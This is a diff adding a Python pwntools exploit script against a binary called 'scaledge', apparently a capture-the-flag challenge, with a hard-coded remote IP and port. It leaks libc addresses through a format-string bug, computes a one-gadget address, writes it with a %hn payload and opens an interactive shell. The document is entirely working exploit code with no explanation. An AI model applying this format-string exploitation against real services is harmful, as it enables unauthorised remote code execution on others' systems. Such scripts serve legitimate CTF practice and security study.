@@ -1,0 +1,49 @@
+#!/usr/bin/python
+from pwn import *
+import time
+
+host = '165.227.168.161'
+port = 1337
+
+def libc_leak (leak):
+	r.sendline (leak)
+	libc_address = int (r.recv (56), 16)
+	return libc_address
+
+def exploit (r):
+	junk = 'A' * 256 + 'B' * 8 + 'C' * 8
+	libc_main_offset = 0x020740
+	sys_offset = libc.symbols ['system']
+	pop_rdi = 0x0923
+	silver_bullet_offset = 0x4526a
+	leak = "%41$p" # Contains address of __libc_start_main
+	libc_base = libc_leak (leak) - libc_main_offset
+	silver_bullet = libc_base + silver_bullet_offset
+	input_on_stack = "%6$p"
+
+	system = sys_offset + libc_base
+	true_pop_rdi = pop_rdi + libc_base
+	bin_sh = libc.search ("/bin/sh").next () + libc_base
+
+	log.info ("Leaked libc address : {0}".format (hex (libc_leak (leak))))
+	log.info ("Libc base address   : {0}".format (hex (libc_base)))
+	log.info ("One gadget          : {0}".format (hex (silver_bullet)))
+	log.info ("Gadget address      : {0}".format (hex (true_pop_rdi)))
+	log.info ("Shell address       : {0}".format (hex (bin_sh)))
+
+	payload = p64(silver_bullet) + '%6$hn'
+	r.sendline (payload)
+	r.interactive ()
+
+if __name__ == '__main__':
+	binary = ELF ('./scaledge')
+	libc = ELF ('./libc-2.23.so')
+
+	if len (sys.argv) > 1:
+		r = remote (host, port)
+		exploit (r)
+	else:
+		r = process ('./scaledge', env = {'LD_PRELOAD' : './libc-2.23.so'})
+		pause ()
+		gdb.attach (r)
+		exploit (r)
